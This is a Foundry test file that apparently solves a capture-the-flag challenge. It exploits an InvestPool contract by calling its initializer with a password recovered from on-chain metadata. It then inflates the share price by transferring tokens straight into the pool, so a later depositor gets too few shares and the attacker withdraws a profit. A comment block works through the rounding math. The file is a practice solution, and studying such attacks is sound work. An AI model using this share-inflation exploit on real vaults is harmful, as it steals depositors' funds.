// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import {PoolToken, InvestPool, IERC20} from "../src/InvestPool.sol";

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
		vm.startPrank(hacker);

        //used hint here. https://playground.sourcify.dev/ and paseted contract bytecode from 0xA45aC53E355161f33fB00d3c9485C77be3c808ae
        //https://ipfs.io/ipfs/QmU3YCRfRZ1bxDNnxB4LVNCUWLs26wVaqPoQSQ6RH2u86V
        pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");
        pool.deposit(10); //deposit
        token.transfer(address(pool), 900e18);
        vm.stopPrank();

        userDeposit(1000e18);

        vm.startPrank(hacker);
        pool.withdrawAll();
		vm.stopPrank();
        console.log(token.balanceOf(hacker));
        console.log(hackerBalanceBeforeHack);
        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}
/*
MATH:
Hacker deposits: 10 lnt and receives 10 shares
Hacker transfers 900e18 to change overall balance on contract

user deposits 1000e18 and receives 11 shares
    tokenToShares(1000e18)
        tokenBalance = 900e18+10
        totalShares = 10
        return (1000e18 * 10) / 900e18+10 = 11

hacker withdrawAll 10 share and receives 904761904761904761909 lnt
    sharesToToken(10)
        tokenBalance = 1900e18 + 10
        totalShares = 21

hacker started with: 1000000000000000000000
hacker ended with  : 1004761904761904761899
*/